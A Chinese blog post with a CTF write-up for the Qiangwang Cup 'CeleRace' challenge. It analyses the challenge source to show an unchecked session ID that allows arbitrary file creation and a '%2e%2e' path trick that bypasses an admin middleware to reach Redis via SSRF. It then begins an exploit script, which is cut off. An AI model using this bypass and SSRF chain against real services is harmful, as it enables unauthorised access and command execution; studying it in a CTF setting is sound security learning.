<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="generator" content="VuePress 2.0.0-rc.20" />
    <style>
      :root {
        --vp-c-bg: #fff;
      }

      [data-theme='dark'] {
        --vp-c-bg: #1b1b1f;
      }

      html,
      body {
        background-color: var(--vp-c-bg);
      }
    </style>
    <script>
      const useChoice = localStorage.getItem('vuepress-color-scheme')
      const systemStatus =
        'matchMedia' in window
          ? window.matchMedia('(prefers-color-scheme: dark)').matches
          : false

      if (useChoice === 'light') {
        document.documentElement.dataset.theme = 'light'
      } else if (useChoice === 'dark' || systemStatus) {
        document.documentElement.dataset.theme = 'dark'
      }
    </script>
    <title>CeleRace | Songsanggggg's Home</title><meta name="description" content="Songsanggggg's Blog Site">
    <link rel="preload" href="/assets/style-CZlZBiRp.css" as="style"><link rel="stylesheet" href="/assets/style-CZlZBiRp.css">
    <link rel="modulepreload" href="/assets/app-Rshun_iY.js"><link rel="modulepreload" href="/assets/Celerace.html-ClFIVXPE.js">
    <link rel="prefetch" href="/assets/index.html-CVk3h03a.js" as="script"><link rel="prefetch" href="/assets/RBAC.html-DdwoVHnn.js" as="script"><link rel="prefetch" href="/assets/SafeBank.html-D-6hQIHL.js" as="script"><link rel="prefetch" href="/assets/SelfIntroduction.html-BvRJYCzP.js" as="script"><link rel="prefetch" href="/assets/Smallcode.html-Ck_oe649.js" as="script"><link rel="prefetch" href="/assets/404.html-CEgwt_k6.js" as="script"><link rel="prefetch" href="/assets/index.html-Bywkv_5L.js" as="script"><link rel="prefetch" href="/assets/index.html-C8fr_AaS.js" as="script"><link rel="prefetch" href="/assets/index.html-CmrEJxMr.js" as="script"><link rel="prefetch" href="/assets/index.html-BobIM6it.js" as="script"><link rel="prefetch" href="/assets/index.html-CnJnYt_5.js" as="script"><link rel="prefetch" href="/assets/index.html-DC26RSqp.js" as="script"><link rel="prefetch" href="/assets/index.html-BkMNc9yX.js" as="script"><link rel="prefetch" href="/assets/index.html-C_RW68H3.js" as="script"><link rel="prefetch" href="/assets/index.html-lz4kzEfe.js" as="script"><link rel="prefetch" href="/assets/index.html-6CnQdE-e.js" as="script"><link rel="prefetch" href="/assets/index.html-DDR4LLXX.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><div class="vp-theme-container external-link-icon" vp-container><!--[--><header class="vp-navbar" vp-navbar><div class="vp-toggle-sidebar-button" title="toggle sidebar" aria-expanded="false" role="button" tabindex="0"><div class="icon" aria-hidden="true"><span></span><span></span><span></span></div></div><span><a class="route-link" href="/"><img class="vp-site-logo" src="https://avatars.githubusercontent.com/u/95994511" alt="Songsanggggg&#39;s Home"><span class="vp-site-name vp-hide-mobile" aria-hidden="true">Songsanggggg&#39;s Home</span></a></span><div class="vp-navbar-items-wrapper" style=""><!--[--><!--]--><nav class="vp-navbar-items vp-hide-mobile" aria-label="site navigation"><!--[--><div class="vp-navbar-item"><a class="route-link auto-link" href="/" aria-label="Home"><!--[--><!--[--><!--]--><!--]-->Home<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/article/" aria-label="Article"><!--[--><!--[--><!--]--><!--]-->Article<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/category/" aria-label="Category"><!--[--><!--[--><!--]--><!--]-->Category<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/tag/" aria-label="Tag"><!--[--><!--[--><!--]--><!--]-->Tag<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/timeline/" aria-label="Timeline"><!--[--><!--[--><!--]--><!--]-->Timeline<!--[--><!--[--><!--]--><!--]--></a></div><!--]--></nav><!--[--><!--]--><button type="button" class="vp-toggle-color-mode-button" title="toggle color mode"><svg class="light-icon" viewbox="0 0 32 32" style=""><path d="M16 12.005a4 4 0 1 1-4 4a4.005 4.005 0 0 1 4-4m0-2a6 6 0 1 0 6 6a6 6 0 0 0-6-6z" fill="currentColor"></path><path d="M5.394 6.813l1.414-1.415l3.506 3.506L8.9 10.318z" fill="currentColor"></path><path d="M2 15.005h5v2H2z" fill="currentColor"></path><path d="M5.394 25.197L8.9 21.691l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 25.005h2v5h-2z" fill="currentColor"></path><path d="M21.687 23.106l1.414-1.415l3.506 3.506l-1.414 1.414z" fill="currentColor"></path><path d="M25 15.005h5v2h-5z" fill="currentColor"></path><path d="M21.687 8.904l3.506-3.506l1.414 1.415l-3.506 3.505z" fill="currentColor"></path><path d="M15 2.005h2v5h-2z" fill="currentColor"></path></svg><svg class="dark-icon" viewbox="0 0 32 32" style="display:none;"><path d="M13.502 5.414a15.075 15.075 0 0 0 11.594 18.194a11.113 11.113 0 0 1-7.975 3.39c-.138 0-.278.005-.418 0a11.094 11.094 0 0 1-3.2-21.584M14.98 3a1.002 1.002 0 0 0-.175.016a13.096 13.096 0 0 0 1.825 25.981c.164.006.328 0 .49 0a13.072 13.072 0 0 0 10.703-5.555a1.01 1.01 0 0 0-.783-1.565A13.08 13.08 0 0 1 15.89 4.38A1.015 1.015 0 0 0 14.98 3z" fill="currentColor"></path></svg></button><!----></div></header><!--]--><div class="vp-sidebar-mask"></div><!--[--><aside class="vp-sidebar" vp-sidebar><nav class="vp-navbar-items" aria-label="site navigation"><!--[--><div class="vp-navbar-item"><a class="route-link auto-link" href="/" aria-label="Home"><!--[--><!--[--><!--]--><!--]-->Home<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/article/" aria-label="Article"><!--[--><!--[--><!--]--><!--]-->Article<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/category/" aria-label="Category"><!--[--><!--[--><!--]--><!--]-->Category<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/tag/" aria-label="Tag"><!--[--><!--[--><!--]--><!--]-->Tag<!--[--><!--[--><!--]--><!--]--></a></div><div class="vp-navbar-item"><a class="route-link auto-link" href="/timeline/" aria-label="Timeline"><!--[--><!--[--><!--]--><!--]-->Timeline<!--[--><!--[--><!--]--><!--]--></a></div><!--]--></nav><!--[--><!--]--><ul class="vp-sidebar-items"><!--[--><li><p tabindex="0" class="vp-sidebar-item vp-sidebar-heading">CeleRace <!----></p><!----></li><!--]--></ul><!--[--><!--]--></aside><!--]--><!--[--><main class="vp-page"><!--[--><!--]--><div vp-content><!--[--><!--]--><div><h1 id="celerace" tabindex="-1"><a class="header-anchor" href="#celerace"><span>CeleRace</span></a></h1><p>该题目来自强网杯初赛，本页书写参考了很多大佬的笔记(在文章末尾有提到)，很早之前就已经写好了，现在用来作为博客的第一篇文章。</p><h2 id="dockerfile" tabindex="-1"><a class="header-anchor" href="#dockerfile"><span>Dockerfile</span></a></h2><p>从 Dockerfile 我们可以看到如下语句：</p><div class="language-docker line-numbers-mode" data-highlighter="prismjs" data-ext="docker"><pre><code><span class="line">chown root:worker /readflag</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>从这里我们可以明确本题的目标，就是要实现RCE通过<code>/readflag</code>来获取 flag ，<code>/readflag</code>要通过 root 用户或 worker 用户组的用户调用。</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line"><span class="token function">useradd</span> <span class="token parameter variable">--system</span> <span class="token parameter variable">--home</span> /app --no-create-home <span class="token parameter variable">--shell</span> /usr/sbin/nologin <span class="token parameter variable">--gid</span> worker <span class="token parameter variable">--groups</span> app worker</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>有用户 worker 属于 worker 用户组，可以调用<code>/readflag</code>拿到 flag。</p><h2 id="supervisord" tabindex="-1"><a class="header-anchor" href="#supervisord"><span>supervisord</span></a></h2><p>在<code>supervisord.conf</code>中我们可以看到主要启动了三个服务，内容如下：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code><span class="line"><span class="token punctuation">[</span>supervisord<span class="token punctuation">]</span></span>
<span class="line"><span class="token assign-left variable">nodaemon</span><span class="token operator">=</span>true</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>program:redis<span class="token punctuation">]</span></span>
<span class="line"><span class="token assign-left variable">command</span><span class="token operator">=</span>/usr/bin/redis-server /app/docker/redis.conf</span>
<span class="line"><span class="token assign-left variable">directory</span><span class="token operator">=</span>/app</span>
<span class="line"><span class="token assign-left variable">autostart</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">autorestart</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">redirect_stderr</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">stdout_logfile</span><span class="token operator">=</span>/dev/stdout</span>
<span class="line"><span class="token assign-left variable">stdout_logfile_maxbytes</span><span class="token operator">=</span><span class="token number">0</span></span>
<span class="line"><span class="token assign-left variable">stdout_logfile_backups</span><span class="token operator">=</span><span class="token number">0</span></span>
<span class="line"><span class="token assign-left variable">user</span><span class="token operator">=</span>redis</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>program:web<span class="token punctuation">]</span></span>
<span class="line"><span class="token assign-left variable">command</span><span class="token operator">=</span>python <span class="token parameter variable">-m</span> src.app</span>
<span class="line"><span class="token assign-left variable">directory</span><span class="token operator">=</span>/app</span>
<span class="line"><span class="token assign-left variable">autostart</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">autorestart</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">redirect_stderr</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">stdout_logfile</span><span class="token operator">=</span>/dev/stdout</span>
<span class="line"><span class="token assign-left variable">stdout_logfile_maxbytes</span><span class="token operator">=</span><span class="token number">0</span></span>
<span class="line"><span class="token assign-left variable">stdout_logfile_backups</span><span class="token operator">=</span><span class="token number">0</span></span>
<span class="line"><span class="token assign-left variable">user</span><span class="token operator">=</span>web</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>program:worker<span class="token punctuation">]</span></span>
<span class="line"><span class="token assign-left variable">command</span><span class="token operator">=</span>celery <span class="token parameter variable">-A</span> src.tasks:celery_app worker <span class="token parameter variable">--loglevel</span><span class="token operator">=</span>info</span>
<span class="line"><span class="token assign-left variable">directory</span><span class="token operator">=</span>/app</span>
<span class="line"><span class="token assign-left variable">autostart</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">autorestart</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">redirect_stderr</span><span class="token operator">=</span>true</span>
<span class="line"><span class="token assign-left variable">stdout_logfile</span><span class="token operator">=</span>/dev/stdout</span>
<span class="line"><span class="token assign-left variable">stdout_logfile_maxbytes</span><span class="token operator">=</span><span class="token number">0</span></span>
<span class="line"><span class="token assign-left variable">stdout_logfile_backups</span><span class="token operator">=</span><span class="token number">0</span></span>
<span class="line"><span class="token assign-left variable">user</span><span class="token operator">=</span>worker</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在这里我们可以看到有三个服务，分别是<code>worker</code>、<code>redis</code>、<code>web</code>，其中<code>worker</code>服务所属用户是worker，所以我们主要目标就是要通过这个服务下手。</p><h2 id="软件功能及源码阅读" tabindex="-1"><a class="header-anchor" href="#软件功能及源码阅读"><span>软件功能及源码阅读</span></a></h2><p>接下来我们进行软件的基本功能了解和源码分析</p><h3 id="软件功能" tabindex="-1"><a class="header-anchor" href="#软件功能"><span>软件功能</span></a></h3><p>打开web界面，我们通过软件界面可以发现软件主要实现了两大部分功能：</p><ol><li>用户管理</li><li>执行制定 tasks 和 tasks 结果查询</li></ol><p>其中 fetch tasks 可以 ssrf 到 redis 服务上，实现 redis 的控制，但是 fetch tasks 需要 admin 权限，才能执行。</p><h3 id="源码分析" tabindex="-1"><a class="header-anchor" href="#源码分析"><span>源码分析</span></a></h3><p>现在的目标就是首先拿到 admin 的权限，之后执行 redis 命令。</p><p>在源码中，对于<code>/tasks/fetch</code>路径，我们引入了<code>require_admin</code>中间件，来实现对于当前路径请求后的用户权限管理。</p><h4 id="任意文件创建" tabindex="-1"><a class="header-anchor" href="#任意文件创建"><span>任意文件创建</span></a></h4><p>在该项目中，我们查看 cookie 可以查看到有一个<code>mini_session</code>，其中核心处理逻辑在如下文件中：<code>/frameword/session.py</code>。</p><p>首先系统对于 session 的处理逻辑如下，首先在账号相关管理中，都会调用<code>save_session</code>方法，该方法位于<code>/framework/app.py</code>中：</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">def</span> <span class="token function">save_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span></span>
<span class="line">    ctx <span class="token operator">=</span> _request_ctx_stack<span class="token punctuation">.</span>top</span>
<span class="line">    <span class="token keyword">if</span> ctx <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> ctx<span class="token punctuation">.</span>session <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">&quot;No session bound to current context&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们可以跟随逻辑可以找到<code>session</code>相关对象为<code>/framework/session.py</code>中的<code>FileSession</code>所定义，其中<code>session</code>的内容由<code>FileSessionManager</code>类管理，我们进一步阅读<code>FileSessionManager</code>对于<code>session</code>的管理逻辑。</p><p>首先在<code>/src/app.py</code>中我们可以读到，当我们需要注册登陆登出时候，系统都会给我们一个对应的<code>cookie</code>来区分不同用户种类。</p><p>其中我们可以看到我们实际上 cookie 的值实际上是一个 sid，在<code>FileSessionManager</code>的处理逻辑中，系统会将对应 sid 的值存入同名文件中，其中默认路径为<code>/tmp/sess</code>我们可以在下面的方法中看到：</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">class</span> <span class="token class-name">FileSessionManager</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token triple-quoted-string string">&quot;&quot;&quot;Manage loading and storing of file-based sessions.&quot;&quot;&quot;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">&quot;devsecret&quot;</span><span class="token punctuation">,</span> directory<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">&quot;/tmp/sess&quot;</span><span class="token punctuation">,</span> cookie_name<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">&quot;mini_session&quot;</span><span class="token punctuation">,</span> nonce_bytes<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span></span>
<span class="line">        self<span class="token punctuation">.</span>secret <span class="token operator">=</span> secret<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token keyword">else</span> secret</span>
<span class="line">        self<span class="token punctuation">.</span>directory <span class="token operator">=</span> directory</span>
<span class="line">        self<span class="token punctuation">.</span>cookie_name <span class="token operator">=</span> cookie_name</span>
<span class="line">        self<span class="token punctuation">.</span>nonce_bytes <span class="token operator">=</span> nonce_bytes</span>
<span class="line">        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>self<span class="token punctuation">.</span>directory<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>之后在<code>save_session方法中的ctx.session.save</code>方法我们可以定位到<code>FileSessionManager</code>类中的如下方法：</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">def</span> <span class="token function">save</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session<span class="token punctuation">:</span> FileSession<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>modified<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span></span>
<span class="line">    path <span class="token operator">=</span> self<span class="token punctuation">.</span>_session_path<span class="token punctuation">(</span>session<span class="token punctuation">.</span>sid<span class="token punctuation">)</span></span>
<span class="line">    tmp_path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">.tmp-</span><span class="token interpolation"><span class="token punctuation">{</span>secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&quot;</span></span></span>
<span class="line">    payload <span class="token operator">=</span> <span class="token punctuation">{</span>key<span class="token punctuation">:</span> value <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> session<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>
<span class="line">    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>tmp_path<span class="token punctuation">,</span> <span class="token string">&quot;w&quot;</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">&quot;utf-8&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fh<span class="token punctuation">:</span></span>
<span class="line">        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> fh<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> separators<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    os<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>tmp_path<span class="token punctuation">,</span> path<span class="token punctuation">)</span></span>
<span class="line">    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">False</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中存储路径的数值和<code>_session_path</code>有关，相关处理逻辑如下：</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">def</span> <span class="token function">_session_path</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">return</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>self<span class="token punctuation">.</span>directory<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>sid<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>该方法将 sid 直接直接和 session 默认存储文件夹路径进行拼接，并且在源代码中没有 sid 有效性检验相关逻辑，如果我们可以控制 sid 的数值，那么我们就可以实现任意文件创建。</p><h4 id="权限绕过及ssrf实现redis命令执行" tabindex="-1"><a class="header-anchor" href="#权限绕过及ssrf实现redis命令执行"><span>权限绕过及ssrf实现redis命令执行</span></a></h4><p>之后我们通过查看本地 session 的值，可以看到 session 内容如下：</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token punctuation">{</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;qwqwqwq&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;role&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;user&quot;</span><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>所以提权的思路分为以下两个思路:</p><ol><li>通过读写操作实现 session 数值的修改</li><li>通过其他方法绕过中间件的权限检验</li></ol><p>在源代码中暂时没有找到相关读写逻辑，但是中间件匹配逻辑中可以找到绕过方法。</p><p>中间件和路径匹配主要由下面方法处理：</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">def</span> <span class="token function">_collect_route_middlewares</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> endpoint<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">[</span>MiddlewareCallable<span class="token punctuation">]</span><span class="token punctuation">:</span></span>
<span class="line">    scoped <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>route_middlewares<span class="token punctuation">.</span>get<span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> scoped<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> scoped</span>
<span class="line">    <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>wildcard_middlewares<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> scoped</span>
<span class="line">    normalized_path <span class="token operator">=</span> self<span class="token punctuation">.</span>_normalize_path<span class="token punctuation">(</span>path<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">for</span> pattern<span class="token punctuation">,</span> middlewares <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>wildcard_middlewares<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_pattern_matches<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> normalized_path<span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">return</span> <span class="token builtin">list</span><span class="token punctuation">(</span>middlewares<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">return</span> scoped</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在上面的方法中，我们观察逻辑可以发现，首先调用了<code>_normalize_path</code>方法，之后按照处理后的路径进行中间件的匹配。</p><p>我们阅读<code>_normalize_path</code>的逻辑：</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token keyword">def</span> <span class="token function">_normalize_path</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token keyword">not</span> path<span class="token punctuation">:</span></span>
<span class="line">        <span class="token keyword">return</span> <span class="token string">&quot;/&quot;</span></span>
<span class="line">    <span class="token keyword">try</span><span class="token punctuation">:</span></span>
<span class="line">        decoded <span class="token operator">=</span> unquote<span class="token punctuation">(</span>path<span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>  <span class="token comment"># pragma: no cover - defensive only</span></span>
<span class="line">        decoded <span class="token operator">=</span> path</span>
<span class="line">    trailing_slash <span class="token operator">=</span> decoded<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span> <span class="token keyword">and</span> decoded <span class="token operator">!=</span> <span class="token string">&quot;/&quot;</span></span>
<span class="line">    normalized <span class="token operator">=</span> posixpath<span class="token punctuation">.</span>normpath<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">&quot;/&quot;</span></span>
<span class="line">    <span class="token keyword">if</span> trailing_slash <span class="token keyword">and</span> normalized <span class="token operator">!=</span> <span class="token string">&quot;/&quot;</span><span class="token punctuation">:</span></span>
<span class="line">        normalized <span class="token operator">=</span> normalized<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;/&quot;</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token keyword">not</span> normalized<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
<span class="line">        normalized <span class="token operator">=</span> <span class="token string">&quot;/&quot;</span> <span class="token operator">+</span> normalized</span>
<span class="line">    <span class="token keyword">return</span> normalized</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>首先通过<code>unquote</code>进行解码，之后通过<code>posixpath.normpath</code>对路径进行标准化，这里如果访问路径<code>/tasks/fetch/%2e%2e/a</code>路径，在上面的函数中会被处理为<code>/tasks/a</code>，之后回到上面的中间件相关方法中，由于路径并不匹配，所以绕过了上面定义的<code>require_admin</code>中间件的权限验证实现越权。</p><p>发送下面的数据包</p><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py"><pre><code><span class="line"><span class="token comment"># https://blog.potatowo.top/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9Bwp/</span></span>
<span class="line"><span class="token keyword">import</span> json</span>
<span class="line"><span class="token keyword">import</span> requests</span>
<span class="line"></span>
<span class="line">URL <span class="token operator">=</span> <span class="token string">&quot;https://127.0.0.1:5001&quot;</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">to_resp</span><span class="token punctuation">(</span>command_line<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span></span>
<span class="line">    args <span class="token operator">=</span> command_line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">    resp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;*</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">\r\n&quot;</span></span></span>
